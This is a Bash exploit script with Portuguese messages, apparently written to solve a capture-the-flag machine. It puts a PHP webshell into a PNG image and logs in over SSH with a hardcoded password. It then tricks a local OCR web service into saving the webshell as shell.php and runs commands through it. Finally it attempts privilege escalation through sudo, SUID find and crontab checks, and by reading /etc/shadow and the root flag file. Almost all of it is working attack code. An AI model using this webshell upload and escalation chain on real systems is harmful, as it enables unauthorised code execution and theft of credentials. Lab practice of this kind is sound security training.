#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Uso: $0 <ip_alvo>"
    exit 1
fi

TARGET=$1
PASSWORD="JbhHDAEgXvri3!"

echo "[+] Criando imagem shell.png com webshell PHP (fonte grande para OCR)..."
python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (800, 100), (255,255,255))
d = ImageDraw.Draw(img)
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 28)
except:
    font = ImageFont.load_default()
d.text((10, 30), '<?php system(\$_GET[\"c\"]); ?>', fill=(0,0,0), font=font)
img.save('shell.png')
"

echo "[+] Enviando shell.png para $TARGET..."
sshpass -p "$PASSWORD" scp shell.png "walter@$TARGET:/home/walter/"

echo "[+] Conectando via SSH e processando OCR..."
sshpass -p "$PASSWORD" ssh "walter@$TARGET" << 'ENDSSH'
    # Codifica e envia para OCR
    B64=$(base64 -w 0 ~/shell.png)
    OCR_ID=$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data-urlencode "canvas_image=data:image/png;base64,$B64" | \
      grep -oP 'ocr_id" value="\K[^"]+')
    echo "OCR_ID: $OCR_ID"

    # Salva como shell.php
    curl -s -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1" > /dev/null

    echo ""
    echo "[+] Testando webshell..."
    WHOAMI=$(curl -s 'http://localhost:8001/saved/shell.php?c=whoami' -u 'walter:JbhHDAEgXvri3!')
    ID=$(curl -s 'http://localhost:8001/saved/shell.php?c=id' -u 'walter:JbhHDAEgXvri3!')
    echo "Webshell executa como: $WHOAMI ($ID)"

    echo ""
    echo "[+] Tentando ler /root/root.txt via webshell (provavelmente falha)..."
    curl -s 'http://localhost:8001/saved/shell.php?c=cat%20/root/root.txt' -u 'walter:JbhHDAEgXvri3!'

    echo ""
    echo "[+] Iniciando escalação de privilégios via SSH (walter)..."
    
    # 1. Verificar sudo sem senha
    if sudo -n true 2>/dev/null; then
        echo "[+] sudo sem senha disponível!"
        ROOT_FLAG=$(sudo cat /root/root.txt 2>/dev/null)
        if [ -n "$ROOT_FLAG" ]; then
            echo "--- FLAG ROOT (via sudo) ---"
            echo "$ROOT_FLAG"
            echo "----------------------------"
        fi
    else
        echo "[-] sudo sem senha NÃO disponível."
    fi

    # 2. Procurar binários SUID interessantes
    echo "[+] Procurando binários SUID..."
    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null | grep -E 'find|python|perl|bash|sh|vim|nano|cp|mv|less|more|awk|sed|grep|tar|zip|unzip|openssl')
    for bin in $SUID_BINS; do
        echo "   Encontrado: $bin"
        # Tentar ler /root/root.txt com cada um (exemplo com find)
        if [[ "$bin" == *"find" ]]; then
            echo "[+] Tentando usar find para ler root.txt..."
            $bin /root -name root.txt -exec cat {} \; 2>/dev/null
        fi
        # Outros podem ser testados, mas fica como exercício
    done

    # 3. Verificar se /root/root.txt é world-readable (improvável, mas tenta)
    if [ -r /root/root.txt ]; then
        echo "--- FLAG ROOT (world-readable) ---"
        cat /root/root.txt
        echo "----------------------------------"
    fi

    # 4. Verificar crontab para tarefas executadas como root
    echo "[+] Verificando crontab..."
    CRON_JOBS=$(crontab -l 2>/dev/null | grep -v '^#')
    if [ -n "$CRON_JOBS" ]; then
        echo "$CRON_JOBS"
        # Se houver algum script gravável, podemos adicionar um comando para copiar a flag
        # (exemplo: se houver um script em /home/walter/backup.sh rodando como root)
    fi

    # 5. Tentar ler /etc/shadow (por via das dúvidas)
    echo "[+] Tentando ler /etc/shadow..."
    SHADOW=$(cat /etc/shadow 2>/dev/null | grep root)
    if [ -n "$SHADOW" ]; then
        echo "Hash do root: $SHADOW"
    fi

    echo ""
    echo "--- FLAG USER (sempre disponível) ---"
    cat /home/walter/user.txt
    echo "-------------------------------------"

    echo "[+] Fim. Se a flag root não apareceu, a escalação manual é necessária."
ENDSSH

echo "[+] Limpando arquivos temporários..."
rm -f shell.png

echo "[+] Concluído!"
